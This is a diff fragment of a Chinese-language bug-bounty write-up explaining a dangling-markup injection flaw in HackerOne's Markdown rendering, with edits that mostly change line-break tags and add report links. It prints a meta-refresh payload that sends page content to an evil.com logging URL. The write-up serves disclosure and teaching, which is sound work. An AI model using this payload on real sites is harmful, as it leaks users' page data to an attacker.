@@ -88,7 +88,7 @@ URL：hackerone.com
 "yyy=xxx" 和 "'test" 的東西。這樣做的時候，我注意到，編輯器會在雙引號裡麵包含一個單
 <br>
 引號 - 這叫做懸置引號。
-<br>
+<p>
 那個時候，我並沒有真正理解它的含義。我知道如果你在某個地方注入另一個單引號，兩個
 <br>
 引號就會被瀏覽器一起解析，瀏覽器會將它們之間的內容視為一個 HTML 元素，例如：
@@ -102,14 +102,15 @@ URL：hackerone.com
 <meta http-equiv="refresh" content='0; url=https://evil.com/log.php?text=
 ```
 瀏覽器會提交兩個引號之間的任何東西。<br />
-現在，結果是，這個已經在 HackerOne 的 #110578報告中由 intidc 公開。<br />
+現在，結果是，這個已經在 HackerOne 的 [https://hackerone.com/reports/110578](#110578)報告中由 [https://hackerone.com/intidc](intidc) 公開。<p>
+
 看到它公開之後，我有一點失望。<br />
 根據 HackerOne，它們依賴於 Redcarpet（一個用於 Markdown 處理的 Ruby 庫）的實現，<br />
 來轉義任何 Markdown 輸入的 HTML 輸出，隨後它會通過 React 組件<br />
 的 dangerouslySetInnerHTML 直接傳遞給 HTML DOM（也就是頁面）。此外，React 是一個<br />
-JavaScript 庫，可用於動態更新 Web 頁面的內容，而不需要重新加載頁面。<br />
+JavaScript 庫，可用於動態更新 Web 頁面的內容，而不需要重新加載頁面。<p>
 DOM 指代用於有效 HTML 以及 格式良好的 XML 的應用程序接口。<br />
-本質上，根據維基百科，DOM 是跨平台並且語言無關的約定，用於展示 HTML、XHTML 和 XMl 中的對象，並與其交互。<br />
+本質上，根據維基百科，DOM 是跨平台並且語言無關的約定，用於展示 HTML、XHTML 和 XMl 中的對象，並與其交互。<p>
 在 HackerOne 的實現中，它們並沒有合理轉義 HTML 輸出，這會導致潛在的漏洞。<br />
 現在，也就是說，查看披露，我覺得我應該測試一下心得代碼。我返回並測試了這個：
 ```html
